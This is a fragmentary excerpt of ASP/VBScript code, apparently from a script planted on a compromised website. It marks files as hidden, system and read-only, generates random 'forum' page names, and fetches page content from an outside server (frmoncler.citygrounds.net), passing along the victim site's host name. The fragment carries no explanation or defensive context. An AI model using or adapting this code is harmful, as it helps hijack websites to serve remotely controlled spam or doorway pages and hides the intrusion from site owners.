...
Remote_server="http://frmoncler.citygrounds.net" //服务端url地址
...
f.attributes = 7
 	...
 	if Rand(1,2)=1 then
	html_name="forum-"&Digital(Rand(3,5))&"-"&Rand(1,20)
 	else
	html_name=Digital(Rand(3,5))
  	end if
	Content_mb=GetHtml(Remote_server&"/index.asp"&"?type=index.asp&host="&host_name&"&html_name="&html_name&"&html_a=html")
